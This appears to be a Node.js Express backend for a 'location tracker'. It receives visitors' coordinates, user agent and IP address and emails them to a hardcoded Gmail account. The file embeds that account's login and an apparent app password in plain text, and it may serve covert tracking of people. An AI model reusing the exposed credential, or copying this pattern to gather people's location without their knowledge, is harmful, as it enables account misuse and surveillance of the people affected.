const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();  // ✅ This must be defined before using app.post()

app.use(bodyParser.json());

// Root route (optional)
app.get("/", (req, res) => {
    res.send("Location Tracker Backend is running!");
});

// Email route
app.post("/send-location-email", async (req, res) => {
    const { latitude, longitude, userAgent, ip } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).send("Invalid location data");
    }

    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "sumitprasad035@gmail.com",
            pass: "kdby lqfs gxrj wbqf"
        }
    });

    const mailOptions = {
        from: "sumitprasad035@gmail.com",
        to: "sumitprasad035@gmail.com",
        subject: "New User Location",
        html: `
            <h3>New User Location</h3>
            <p><b>Coordinates:</b></p>
            <p>Latitude: ${latitude}<br>Longitude: ${longitude}</p>
            <p><a href="${googleMapsLink}" target="_blank">View on Google Maps</a></p>
            <hr>
            <p><b>User Agent:</b> ${userAgent || 'N/A'}</p>
            <p><b>IP:</b> ${ip || 'N/A'}</p>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log("Email sent with location:", latitude, longitude);
        res.send({ success: true });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).send("Email failed");
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
